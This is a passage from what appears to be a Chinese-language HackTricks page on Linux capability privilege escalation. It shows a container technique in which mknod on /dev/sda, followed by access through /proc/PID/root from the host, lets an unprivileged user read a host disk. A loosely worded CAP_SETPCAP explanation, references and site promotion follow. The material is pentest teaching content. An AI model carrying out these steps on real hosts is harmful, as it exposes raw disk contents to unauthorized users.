   2. 获取要读取的设备。例如：`/dev/sda`
2. 作为 `root` 在容器中执行以下操作：
```bash
# Create a new block special file matching the host device
mknod /dev/sda b
# Configure the permissions
chmod ug+w /dev/sda
# Create the same standard user than the one on host
useradd -u 1000 unprivileged
# Login with that user
su unprivileged
```
1. 回到主机：
```bash
# Find the PID linked to the container owns by the user "unprivileged"
# Example only (Depends on the shell program, etc.). Here: PID=18802.
$ ps aux | grep -i /bin/sh | grep -i unprivileged
unprivileged        18802  0.0  0.0   1712     4 pts/0    S+   15:27   0:00 /bin/sh
```

```bash
# Because of user namespace sharing, the unprivileged user have access to the container filesystem, and so the created block special file pointing on /dev/sda
head /proc/18802/root/dev/sda
```
攻击者现在可以从非特权用户读取、转储、复制设备/dev/sda。

### CAP\_SETPCAP

**`CAP_SETPCAP`** 是一种Linux能力，允许一个进程**修改另一个进程的能力集**。它授予了向其他进程的有效、可继承和允许的能力集中添加或删除能力的能力。然而，对于如何使用这种能力存在一定的限制。

具有`CAP_SETPCAP`的进程**只能授予或删除其自身允许的能力集中的能力**。换句话说，如果一个进程本身没有某个能力，它就不能将该能力授予另一个进程。这个限制防止了一个进程将另一个进程的权限提升到自身权限之上。

此外，在最近的内核版本中，`CAP_SETPCAP`能力已经**进一步受到限制**。它不再允许一个进程任意修改其他进程的能力集。相反，它**只允许一个进程降低其自身允许的能力集或其后代的允许的能力集**。这个改变是为了减少与能力相关的潜在安全风险。

要有效地使用`CAP_SETPCAP`，您需要在您的有效能力集中具有该能力，并在您的允许能力集中具有目标能力。然后，您可以使用`capset()`系统调用来修改其他进程的能力集。

总之，`CAP_SETPCAP`允许一个进程修改其他进程的能力集，但它不能授予自身没有的能力。此外，由于安全问题，它在最近的内核版本中的功能已被限制为只允许降低其自身允许的能力集或其后代的允许的能力集。

## 参考资料

**这些示例大部分来自** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com)，因此如果您想练习这些权限提升技术，我推荐这些实验室。

**其他参考资料**：

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) 是西班牙最重要的网络安全活动之一，也是欧洲最重要的网络安全活动之一。作为促进技术知识的使命，这个大会是技术和网络安全专业人士在各个领域的热点交流。

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在一家**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>
